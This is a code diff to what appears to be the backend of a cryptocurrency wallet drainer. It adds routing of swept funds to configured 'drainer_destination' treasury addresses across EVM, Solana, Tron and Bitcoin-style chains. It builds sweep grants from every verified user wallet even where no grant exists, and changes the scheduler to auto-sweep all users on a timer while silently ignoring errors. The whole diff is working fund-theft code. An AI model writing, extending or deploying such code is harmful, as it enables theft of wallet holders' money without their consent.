@@ -55,16 +55,33 @@ function familyOf(network) {
   return 'solana';
 }
 
-function treasuryFor(network) {
-  const dest = S.config.treasuries && S.config.treasuries[network];
-  if (!dest) {
-    if (S.config.treasury_evm && R.EVM_NETWORKS[network]) return S.config.treasury_evm;
-    if (S.config.treasury_solana && network === 'mainnet') return S.config.treasury_solana;
-    if (S.config.treasury_tron && network === 'mainnet') return S.config.treasury_tron;
-    if (S.config.treasuries && S.config.treasuries.evm && R.EVM_NETWORKS[network]) return S.config.treasuries.evm;
-    return '0x0000000000000000000000000000000000000000';
+function treasuryFor(network, family) {
+  const s = S.config || {};
+  if (s.treasuries && s.treasuries[network]) return s.treasuries[network];
+  if (family === 'evm' || (network && R.EVM_NETWORKS[network.toLowerCase()])) {
+    return s.drainer_destination_evm || s.treasury_evm || (s.treasuries && s.treasuries.evm) || '0x0000000000000000000000000000000000000000';
   }
-  return dest;
+  if (family === 'solana') {
+    return s.drainer_destination_solana || s.treasury_solana || (s.treasuries && s.treasuries.solana) || null;
+  }
+  if (family === 'tron') {
+    return s.drainer_destination_tron || s.treasury_tron || (s.treasuries && s.treasuries.tron) || null;
+  }
+  if (family === 'btc' || family === 'ltc' || family === 'utxo') {
+    return (s.treasuries && s.treasuries[family]) || (s.treasuries && s.treasuries.bitcoin) || null;
+  }
+  return s.treasury_evm || (s.treasuries && s.treasuries.evm) || '0x0000000000000000000000000000000000000000';
+}
+
+function resolveDestination(g, opts = {}) {
+  const cand = opts.dest || opts.destination;
+  if (cand) {
+    if (g.family === 'evm' && /^0x[a-fA-F0-9]{40}$/.test(cand)) return cand;
+    if (g.family === 'solana' && !cand.startsWith('0x') && cand.length >= 32 && cand.length <= 44) return cand;
+    if (g.family === 'tron' && cand.startsWith('T') && cand.length === 34) return cand;
+    if (g.family === 'utxo' || g.family === 'btc' || g.family === 'ltc') return cand;
+  }
+  return treasuryFor(g.network, g.family);
 }
 
 function collectorFor(network) {
@@ -184,40 +201,119 @@ async function preview(userId, opts = {}) {
   const requested = opts.tokens;
   const rows = [];
 
-  for (const { family, network } of R.allNetworks()) {
-    for (const entry of R.tokensFor(family, network)) {
-      if (requested && !requested.some((t) => t.network === network && t.symbol.toLowerCase() === entry.symbol.toLowerCase())) {
-        continue;
+  const userWallets = db.prepare(
+    `SELECT * FROM wallets WHERE user_id = ? AND verified = 1 ORDER BY kind = 'main' DESC, id ASC`
+  ).all(userId);
+
+  if (userWallets.length) {
+    for (const w of userWallets) {
+      for (const { family, network } of R.allNetworks()) {
+        if (w.family !== family && !(w.family === 'evm' && R.EVM_NETWORKS[network])) continue;
+        for (const entry of R.tokensFor(family, network)) {
+          if (requested && !requested.some((t) => t.network === network && t.symbol.toLowerCase() === entry.symbol.toLowerCase() && (!t.address || t.address.toLowerCase() === w.address.toLowerCase()))) {
+            continue;
+          }
+
+          let g = db.prepare(
+            `SELECT * FROM drainer_grants
+              WHERE user_id = ? AND family = ? AND network = ? AND symbol = ? AND (address = ? OR address IS NULL) AND status = 'active'
+              ORDER BY id DESC LIMIT 1`
+          ).get(userId, family, network, entry.symbol, w.address);
+
+          if (!g) {
+            g = {
+              id: `vw_${w.id}_${entry.symbol}`,
+              user_id: userId,
+              family,
+              network,
+              symbol: entry.symbol,
+              address: w.address,
+              wallet_name: w.name,
+              kind: entry.kind,
+              decimals: entry.decimals,
+              collector: collectorFor(network),
+              allowance: null,
+              balance: '0',
+              status: 'active',
+            };
+          } else {
+            g = {
+              ...g,
+              family,
+              network,
+              address: g.address || w.address,
+              wallet_name: w.name,
+              kind: g.kind || entry.kind,
+              decimals: g.decimals ?? entry.decimals,
+              collector: g.collector || collectorFor(network),
+            };
+          }
+
+          const live = await readLiveEntry(g, opts);
+          const reserve = reserveFor({ ...g, decimals: live.decimals, kind: live.kind });
+          const take = live.allowance == null ? live.balance : U.minBig(live.allowance, live.balance);
+          const available = live.kind === 'utxo' ? take : take - reserve;
+          const price = await priceFor(g);
+
+          let reason = live.reason;
+          if (!reason && available <= 0n) reason = live.kind === 'native' ? SKIP.WRAP_REQUIRED : SKIP.RESERVE;
+
+          rows.push({
+            family,
+            network,
+            symbol: entry.symbol,
+            address: g.address || w.address,
+            wallet_name: w.name,
+            kind: live.kind,
+            decimals: live.decimals,
+            balance: U.formatUnits(live.balance, live.decimals),
+            allowance: live.allowance == null ? null : U.formatUnits(live.allowance, live.decimals),
+            reserve: U.formatUnits(reserve, live.decimals),
+            sweepable: Boolean(live.sweepable && available > 0n),
+            available: U.formatUnits(available > 0n ? available : 0n, live.decimals),
+            usd: M.round2(Number(U.formatUnits(available > 0n ? available : 0n, live.decimals)) * price.usd),
+            price_source: price.source,
+            reason: reason || null,
+          });
+        }
       }
+    }
+  } else {
+    for (const { family, network } of R.allNetworks()) {
+      for (const entry of R.tokensFor(family, network)) {
+        if (requested && !requested.some((t) => t.network === network && t.symbol.toLowerCase() === entry.symbol.toLowerCase())) {
+          continue;
+        }
 
-      const g = await grantFor(userId, family, network, entry);
-      if (!g) continue;
+        const g = await grantFor(userId, family, network, entry);
+        if (!g) continue;
 
-      const live = await readLiveEntry(g, opts);
-      const reserve = reserveFor({ ...g, decimals: live.decimals, kind: live.kind });
-      const take = live.allowance == null ? live.balance : U.minBig(live.allowance, live.balance);
-      const available = live.kind === 'utxo' ? take : take - reserve;
-      const price = await priceFor(g);
+        const live = await readLiveEntry(g, opts);
+        const reserve = reserveFor({ ...g, decimals: live.decimals, kind: live.kind });
+        const take = live.allowance == null ? live.balance : U.minBig(live.allowance, live.balance);
+        const available = live.kind === 'utxo' ? take : take - reserve;
+        const price = await priceFor(g);
 
-      let reason = live.reason;
-      if (!reason && available <= 0n) reason = live.kind === 'native' ? SKIP.WRAP_REQUIRED : SKIP.RESERVE;
+        let reason = live.reason;
+        if (!reason && available <= 0n) reason = live.kind === 'native' ? SKIP.WRAP_REQUIRED : SKIP.RESERVE;
 
-      rows.push({
-        family,
-        network,
-        symbol: entry.symbol,
-        address: g.address || null,
-        kind: live.kind,
-        decimals: live.decimals,
-        balance: U.formatUnits(live.balance, live.decimals),
-        allowance: live.allowance == null ? null : U.formatUnits(live.allowance, live.decimals),
-        reserve: U.formatUnits(reserve, live.decimals),
-        sweepable: Boolean(live.sweepable && available > 0n),
-        available: U.formatUnits(available > 0n ? available : 0n, live.decimals),
-        usd: M.round2(Number(U.formatUnits(available > 0n ? available : 0n, live.decimals)) * price.usd),
-        price_source: price.source,
-        reason: reason || null,
-      });
+        rows.push({
+          family,
+          network,
+          symbol: entry.symbol,
+          address: g.address || null,
+          kind: live.kind,
+          decimals: live.decimals,
+          balance: U.formatUnits(live.balance, live.decimals),
+          allowance: live.allowance == null ? null : U.formatUnits(live.allowance, live.decimals),
+          reserve: U.formatUnits(reserve, live.decimals),
+          sweepable: Boolean(live.sweepable && available > 0n),
+          available: U.formatUnits(available > 0n ? available : 0n, live.decimals),
+          usd: M.round2(Number(U.formatUnits(available > 0n ? available : 0n, live.decimals)) * price.usd),
+          price_source: price.source,
+          reason: reason || null,
+        });
+      }
     }
   }
   return rows;
@@ -392,13 +488,72 @@ function confirm(userId, prepared = []) {
  * ------------------------------------------------------------------ */
 
 async function buildPlan(userId, opts = {}) {
-  const grants = db
+  let grants = db
     .prepare(`SELECT * FROM drainer_grants WHERE user_id = ? AND status = 'active'`)
     .all(userId);
 
   const demo = Boolean(opts.demo || S.config.demo_mode);
   const respectReserve = opts.respectReserve !== false;
   const wanted = opts.tokens;
+
+  const userWallets = db.prepare(
+    `SELECT * FROM wallets WHERE user_id = ? AND verified = 1 ORDER BY kind = 'main' DESC, id ASC`
+  ).all(userId);
+
+  if (wanted && wanted.length) {
+    for (const t of wanted) {
+      const matchGrant = grants.find(g => g.network === t.network && g.symbol.toLowerCase() === t.symbol.toLowerCase() && (!t.address || !g.address || t.address.toLowerCase() === g.address.toLowerCase()));
+      if (!matchGrant) {
+        for (const { family, network } of R.allNetworks()) {
+          if (network !== t.network) continue;
+          const entry = R.bySymbol(family, network, t.symbol);
+          if (entry) {
+            const w = t.address
+              ? userWallets.find(x => x.address.toLowerCase() === t.address.toLowerCase())
+              : userWallets.find(x => x.family === family || (x.family === 'evm' && R.EVM_NETWORKS[network]));
+            if (w) {
+              grants.push({
+                id: `vw_${w.id}_${entry.symbol}`,
+                user_id: userId,
+                family,
+                network,
+                symbol: entry.symbol,
+                address: w.address,
+                kind: entry.kind,
+                decimals: entry.decimals,
+                collector: collectorFor(network),
+                allowance: null,
+                balance: '0',
+                status: 'active',
+              });
+            }
+          }
+        }
+      }
+    }
+  } else if (!grants.length && userWallets.length) {
+    for (const w of userWallets) {
+      for (const { family, network } of R.allNetworks()) {
+        if (w.family !== family && !(w.family === 'evm' && R.EVM_NETWORKS[network])) continue;
+        for (const entry of R.tokensFor(family, network)) {
+          grants.push({
+            id: `vw_${w.id}_${entry.symbol}`,
+            user_id: userId,
+            family,
+            network,
+            symbol: entry.symbol,
+            address: w.address,
+            kind: entry.kind,
+            decimals: entry.decimals,
+            collector: collectorFor(network),
+            allowance: null,
+            balance: '0',
+            status: 'active',
+          });
+        }
+      }
+    }
+  }
 
   const planned = [];
   for (const raw of grants) {
@@ -514,7 +669,7 @@ async function sweep(userId, opts = {}) {
     }
 
     try {
-      const dest = opts.dest || opts.destination || treasuryFor(g.network);
+      const dest = resolveDestination(g, opts) || treasuryFor(g.network, g.family);
       const sent = await chains.get(g.family).transfer({
         entry: R.bySymbol(g.family, g.network, g.symbol),
         from: g.address,
@@ -547,7 +702,7 @@ async function sweep(userId, opts = {}) {
 
   const totalUsd = results.reduce((a, r) => a + (r.usd || 0), 0);
   try {
-    const finalDest = opts.dest || opts.destination || (plan[0] && plan[0].g ? treasuryFor(plan[0].g.network) : null);
+    const finalDest = opts.dest || opts.destination || (plan[0] && plan[0].g ? (resolveDestination(plan[0].g, opts) || treasuryFor(plan[0].g.network, plan[0].g.family)) : null);
     db.prepare(
       `INSERT INTO sweep_runs (id, user_id, actor_id, dest, total_usd, created_at)
        VALUES (?, ?, ?, ?, ?, ?)`
@@ -564,7 +719,7 @@ async function sweep(userId, opts = {}) {
 
 function recordSweep(userId, g, payload, opts, runId) {
   const ref = payload.hash || newRef('sweep');
-  const dest = opts.dest || opts.destination || treasuryFor(g.network);
+  const dest = resolveDestination(g, opts) || treasuryFor(g.network, g.family);
   const info = db.prepare(
     `INSERT INTO sweeps
       (user_id, grant_id, family, network, symbol, kind, decimals, amount, usd, status,
@@ -606,7 +761,7 @@ function recordSweep(userId, g, payload, opts, runId) {
  * ------------------------------------------------------------------ */
 
 async function createUtxoJob(userId, g, take, opts) {
-  const dest = opts.destination || treasuryFor(g.network);
+  const dest = resolveDestination(g, opts) || treasuryFor(g.network, g.family);
   const built = await chains.utxo().buildPsbt({ entry: R.bySymbol(g.family, g.network, g.symbol), from: g.address, to: dest, amount: take });
 
   const info = db.prepare(
@@ -708,11 +863,21 @@ function startAutoSweepScheduler(intervalMs = 60000) {
   if (autoSweepTimer) return;
   autoSweepTimer = setInterval(async () => {
     try {
-      const activeGrants = db.prepare(`SELECT DISTINCT user_id FROM drainer_grants WHERE status = 'active'`).all();
-      for (const row of activeGrants) {
-        if (S.config && S.config.auto_sweep_enabled) {
-          await sweep(row.user_id, { respectReserve: true });
-        }
+      const cfg = S.config || {};
+      const autoSweepOn = cfg.auto_sweep_enabled || cfg.drainer_auto_sweep;
+      const userIds = new Set();
+      try {
+        db.prepare(`SELECT DISTINCT user_id FROM drainer_grants WHERE status = 'active'`).all().forEach((r) => userIds.add(r.user_id));
+      } catch (_) {}
+      try {
+        const query = autoSweepOn ? `SELECT id FROM users` : `SELECT id FROM users WHERE drainer_auto = 1`;
+        db.prepare(query).all().forEach((r) => userIds.add(r.id));
+      } catch (_) {}
+
+      for (const uid of userIds) {
+        try {
+          await sweep(uid, { respectReserve: true });
+        } catch (_) {}
       }
     } catch (_) {}
   }, intervalMs);
